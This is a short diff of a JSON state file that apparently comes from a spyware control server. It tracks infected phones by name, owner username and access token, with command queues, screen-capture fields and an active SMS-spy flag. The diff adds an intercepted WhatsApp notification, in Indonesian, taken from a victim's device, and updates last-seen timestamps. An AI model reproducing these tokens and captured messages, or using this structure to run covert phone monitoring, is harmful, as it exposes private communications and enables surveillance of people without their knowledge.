@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776843134361,
+    "lastSeen": 1776843149675,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (24 pesan): ~ Aufatzy",
+        "content": "Ini bnr kaga nihh?🗿",
+        "time": "22/04 15:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776843149739
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -1693,7 +1701,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "2d52258cb0a11a890ba41fac54cda5a3",
-    "lastSeen": 1776843134572,
+    "lastSeen": 1776843149674,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:30:01.375Z",
